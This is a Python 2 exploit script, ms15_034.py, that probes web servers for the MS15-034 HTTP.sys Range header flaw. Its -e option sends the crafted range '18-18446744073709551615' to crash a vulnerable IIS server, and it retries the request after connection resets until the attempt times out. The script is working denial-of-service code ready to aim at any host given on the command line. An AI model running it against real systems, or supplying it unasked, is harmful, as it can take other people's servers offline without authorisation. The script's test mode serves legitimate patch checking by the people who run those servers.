#!/usr/bin/python

import urllib2
import sys
import argparse
import socket 

''' get cl args '''
def getArgs():
    parser = argparse.ArgumentParser( prog="ms15_034.py", 
				      formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
				      epilog= "This script will either test for the presence of or exploit a DOS condition for MS15_034")
    parser.add_argument("target",  help="Target Host in the form of http://[host]:[port] -- specify port only if not 80" )								  
    parser.add_argument("-p", "--path", default="/welcome.png", help="Path to resource to request on target server [default = /welcome.png]")
    parser.add_argument("-e", "--exploit", action="store_true", default=False, help="Exploit with DoS condition [default = False]")
    parser.add_argument("-r", "--range", default="0-18446744073709551615", help="Value for range header [default=0-18446744073709551615]; changing could cause DoS!!!")
    args = parser.parse_args()
    return args
 
''' make the evil request and examine response to determine vulnerability '''
def evilRequest(req, exploit):
	res = ""
	if exploit:
		print "[*] Attempting exploit..."
	try:
		res = urllib2.urlopen(req).read() # make request
		if exploit:
			print "[*] Could not parse response, check target to see if DoS was successful"
		else:
			print "[*] Request successful, likely not vulnerable" # if no error is returned, the target is probably not vulnerable
	except:
		if "Requested Range Not Satisfiable" in str(sys.exc_info()[1]): # response if target is unpatched 
			print "[*] Target appears vulnerable!!!"
		elif "The Request has an invalid header name" in str(sys.exc_info()[1]): # typical response if target is patched 
			print "[*] Target appears patched"
		elif (("Connection reset by peer" in str(sys.exc_info()[1])) or ("forcibly closed" in str(sys.exc_info()[1]))) and (exploit): # often DoS exploit not successful on first attempt
			print "[*] Connection Reset, re-attempting exploit..."
			res = evilRequest(req, exploit)
		elif ("timed out" in str(sys.exc_info()[1])) and (exploit): # prevent loop after DoS function (used w/ socket timeout variable in main)
			print "[*] Request timed out, DoS likely successful"
		elif ("timed out" in str(sys.exc_info()[1])) and (not exploit): # prevent loop after DoS function (used w/ socket timeout variable in main)
			print "[*] Request timed out, but exploit switch not used. Did you crash the target with a modified range header?"
		else: 
			print "[*] Cannot determine if target is vulnerable" # any other response means vuln unknown
		print "\t[+] Response: %s" % str(sys.exc_info()[1])  # print server response
 
	return res 
	
''' main '''
def main():
	print
	print '============================================================================='
	print '|                     ms15_034.py - Test and DoS exploit                    |'
	print '|               Author: Mike Czumak (T_v3rn1x) - @SecuritySift              |'
	print '=============================================================================\n'
    	
	args = getArgs() 
	target = args.target   # target server
	path = args.path       # path to resource to retrieve on target server
	range = args.range     # value of Range header
	exploit = args.exploit # boolean (exploit DoS or not)
	
	if exploit:
		range = "18-18446744073709551615" # evil range if requesting welcome.png
										   # may need to change if requesting different resource (use range arg instead)
										  
	print "[*] Making request to " + target
	print "\t[+] Target path: " + path
	print "\t[+] Range Header: " + range
	print "\t[+] Exploit (DoS)?: " + str(exploit)
	print
	
	socket.setdefaulttimeout(10) # timeout the connection in event of DoS/reboot
	req = urllib2.Request( "%s%s"%(target,path), headers={ "Range" : "bytes=%s" % range }) # format request
	res = evilRequest(req, exploit) # make request
	print res

if __name__ == '__main__':
    main()
